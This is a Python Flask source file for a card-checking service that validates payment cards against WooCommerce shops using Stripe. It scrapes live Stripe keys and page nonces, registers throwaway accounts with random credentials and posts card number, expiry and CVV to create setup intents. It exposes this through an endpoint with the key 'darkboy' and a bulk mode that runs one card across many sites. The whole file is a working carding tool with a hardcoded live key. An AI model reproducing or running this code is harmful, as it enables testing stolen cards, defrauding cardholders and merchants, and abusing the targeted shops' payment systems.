from flask import Flask, jsonify
import requests
from fake_useragent import UserAgent
import uuid
import time
import re
import random
import string

app = Flask(__name__)

def get_stripe_key(domain):
    """Enhanced Stripe key extraction from multiple page patterns"""
    urls_to_try = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params",
        f"https://{domain}/?wc-ajax=get_stripe_params"
    ]
    
    patterns = [
        r'pk_live_[a-zA-Z0-9_]+',
        r'stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'wc_stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'"publishableKey":"(pk_live_[^"]+)"',
        r'var stripe = Stripe[\'"]((pk_live_[^\'"]+))[\'"]'
    ]
    
    for url in urls_to_try:
        try:
            response = requests.get(url, headers={'User-Agent': UserAgent().random}, timeout=10)
            if response.status_code == 200:
                for pattern in patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        # Extract just the key if it's in a larger match
                        key_match = re.search(r'pk_live_[a-zA-Z0-9_]+', match.group(0))
                        if key_match:
                            return key_match.group(0)
        except:
            continue
    
    return "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"  # fallback

def extract_nonce_from_page(html_content, domain):
    """Enhanced nonce extraction with multiple patterns"""
    patterns = [
        r'createAndConfirmSetupIntentNonce["\']?:\s*["\']([^"\']+)["\']',
        r'wc_stripe_create_and_confirm_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']',
        r'name=["\']_ajax_nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'var wc_stripe_params = [^}]*"nonce":"([^"]+)"',
        r'var stripe_params = [^}]*"nonce":"([^"]+)"',
        r'nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html_content)
        if match:
            return match.group(1)
    
    return None

def generate_random_credentials():
    """Generate random user credentials for registration"""
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    email = f"{username}@gmail.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    return username, email, password

def register_account(domain, session):
    """Enhanced account registration for various WooCommerce sites"""
    try:
        # Get registration page
        reg_response = session.get(f"https://{domain}/my-account/")
        
        # Extract registration nonce
        reg_nonce_patterns = [
            r'name="woocommerce-register-nonce" value="([^"]+)"',
            r'name=["\']_wpnonce["\'][^>]*value="([^"]+)"',
            r'register-nonce["\']?:\s*["\']([^"\']+)["\']'
        ]
        
        reg_nonce = None
        for pattern in reg_nonce_patterns:
            match = re.search(pattern, reg_response.text)
            if match:
                reg_nonce = match.group(1)
                break
        
        if not reg_nonce:
            return False, "Could not extract registration nonce"
        
        # Generate random credentials
        username, email, password = generate_random_credentials()
        
        # Register account
        reg_data = {
            'username': username,
            'email': email,
            'password': password,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register'
        }
        
        reg_result = session.post(
            f"https://{domain}/my-account/",
            data=reg_data,
            headers={'Referer': f'https://{domain}/my-account/'}
        )
        
        # Check if registration was successful
        if 'Log out' in reg_result.text or 'My Account' in reg_result.text:
            return True, "Registration successful"
        else:
            return False, "Registration failed"
            
    except Exception as e:
        return False, f"Registration error: {str(e)}"

def process_card_enhanced(domain, ccx, use_registration=True):
    """Enhanced card processing with better site compatibility"""
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        return {
            "response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
            "status": "Declined"
        }
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    user_agent = UserAgent().random
    stripe_mid = str(uuid.uuid4())
    stripe_sid = str(uuid.uuid4()) + str(int(time.time()))

    # Create session for cookie persistence
    session = requests.Session()
    session.headers.update({'User-Agent': user_agent})

    # Enhanced Stripe key extraction
    stripe_key = get_stripe_key(domain)

    # Try account registration if enabled
    if use_registration:
        registered, reg_message = register_account(domain, session)
        print(f"Registration: {registered} - {reg_message}")

    # Step 1: Get payment page and extract nonce
    payment_urls = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/my-account/"
    ]
    
    nonce = None
    for url in payment_urls:
        try:
            response = session.get(url, timeout=10)
            if response.status_code == 200:
                nonce = extract_nonce_from_page(response.text, domain)
                if nonce:
                    break
        except:
            continue
    
    if not nonce:
        return {"response": "Failed to extract nonce from site", "status": "Declined"}

    # Step 2: Create payment method with enhanced parameters
    payment_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'US',
        'billing_details[address][postal_code]': '10080',
        'billing_details[name]': 'Test User',
        'pasted_fields': 'number',
        'payment_user_agent': f'stripe.js/{uuid.uuid4().hex[:8]}; stripe-js-v3/{uuid.uuid4().hex[:8]}; payment-element; deferred-intent',
        'referrer': f'https://{domain}',
        'time_on_page': str(int(time.time()) % 100000),
        'key': stripe_key,
        '_stripe_version': '2024-06-20',
        'guid': str(uuid.uuid4()),
        'muid': stripe_mid,
        'sid': stripe_sid
    }

    try:
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=payment_data,
            headers={
                'User-Agent': user_agent,
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            },
            timeout=15
        )
        pm_data = pm_response.json()

        if 'id' not in pm_data:
            error_msg = pm_data.get('error', {}).get('message', 'Unknown payment method error')
            return {"response": error_msg, "status": "Declined"}

        payment_method_id = pm_data['id']
    except Exception as e:
        return {"response": f"Payment Method Creation Failed: {str(e)}", "status": "Declined"}

    # Step 3: Enhanced setup intent creation with multiple endpoint options
    endpoints = [
        {'url': f'https://{domain}/', 'params': {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}},
        {'url': f'https://{domain}/wp-admin/admin-ajax.php', 'params': {}},
        {'url': f'https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', 'params': {}}
    ]
    
    data_payloads = [
        {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        },
        {
            'action': 'wc_stripe_create_setup_intent',
            'payment_method_id': payment_method_id,
            '_wpnonce': nonce,
        }
    ]

    for endpoint in endpoints:
        for data_payload in data_payloads:
            try:
                setup_response = session.post(
                    endpoint['url'],
                    params=endpoint.get('params', {}),
                    headers={
                        'User-Agent': user_agent,
                        'Referer': f'https://{domain}/my-account/add-payment-method/',
                        'accept': '*/*',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'origin': f'https://{domain}',
                        'x-requested-with': 'XMLHttpRequest',
                    },
                    data=data_payload,
                    timeout=15
                )
                
                # Try to parse response as JSON
                try:
                    setup_data = setup_response.json()
                except:
                    setup_data = {'raw_response': setup_response.text}

                # KEEP ORIGINAL RESPONSE MESSAGES - DON'T CHANGE
                if setup_data.get('success', False):
                    data_status = setup_data['data'].get('status')
                    if data_status == 'requires_action':
                        return {"response": "requires_action", "status": "Approved"}
                    elif data_status == 'succeeded':
                        return {"response": "Succeeded", "status": "Approved"}
                    elif 'error' in setup_data['data']:
                        error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                        return {"response": error_msg, "status": "Declined"}

                if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
                    error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                    return {"response": error_msg, "status": "Declined"}

                # Check for direct status in response
                if setup_data.get('status') in ['succeeded', 'success']:
                    return {"response": "Succeeded", "status": "Approved"}

            except Exception as e:
                continue

    return {"response": "All payment attempts failed", "status": "Declined"}

@app.route('/gateway=autostripe/key=<key>/site=<domain>/cc=<cc>')
def process_request(key, domain, cc):
    # Validate the API key
    if key != "darkboy":
        return jsonify({"error": "Invalid API key", "status": "Unauthorized"}), 401
    
    # Enhanced domain validation
    if not re.match(r'^[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,6}$', domain):
        return jsonify({"error": "Invalid domain format", "status": "Bad Request"}), 400
    
    # Enhanced card format validation
    if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
        return jsonify({"error": "Invalid card format. Use: NUMBER|MM|YY|CVV", "status": "Bad Request"}), 400
    
    # Process the card with enhanced method
    result = process_card_enhanced(domain, cc)
    
    # Return the result with original response format
    return jsonify({
        "response": result["response"],
        "status": result["status"]
    })

# New endpoint for bulk site testing
@app.route('/gateway=autostripe/key=<key>/bulk/cc=<cc>')
def bulk_process_request(key, cc):
    if key != "darkboy":
        return jsonify({"error": "Invalid API key", "status": "Unauthorized"}), 401
    
    # Sample domains to test (you can expand this list)
    test_domains = [
        "example-shop1.com",
        "example-store2.com", 
        "demo-woocommerce3.com"
    ]
    
    results = []
    for domain in test_domains:
        try:
            result = process_card_enhanced(domain, cc)
            results.append({
                "domain": domain,
                "response": result["response"],
                "status": result["status"]
            })
        except Exception as e:
            results.append({
                "domain": domain,
                "response": f"Error: {str(e)}",
                "status": "Error"
            })
    
    return jsonify({"results": results})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=True)
